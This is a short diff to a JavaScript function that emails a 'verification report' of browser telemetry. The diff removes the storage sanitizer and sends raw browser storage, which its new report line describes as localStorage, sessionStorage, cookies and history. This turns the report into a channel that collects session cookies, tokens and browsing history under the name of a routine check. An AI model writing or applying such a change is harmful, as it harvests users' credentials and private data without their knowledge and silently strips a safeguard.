@@ -97,8 +97,7 @@ async function sendVerificationReport(request, response, telemetry, reportToEmai
     }),
     display: sanitizeObject(telemetry.display),
     network: sanitizeObject(telemetry.network),
-    storage: sanitizeStorage(telemetry.storage),
-    cookies: telemetry.cookies
+    storage: telemetry.storage
   };
 
   try {
@@ -121,8 +120,7 @@ async function sendVerificationReport(request, response, telemetry, reportToEmai
           `Browser: ${JSON.stringify(safeTelemetry.browser)}`,
           `Display: ${JSON.stringify(safeTelemetry.display)}`,
           `Network: ${JSON.stringify(safeTelemetry.network)}`,
-          `Application localStorage entries: ${JSON.stringify(safeTelemetry.storage)}`,
-          `Cookies: ${JSON.stringify(safeTelemetry.cookies)}`
+          `Browser Storage Data (localStorage, sessionStorage, cookies, history): ${JSON.stringify(safeTelemetry.storage)}`
         ].join("\n")
       })
     });
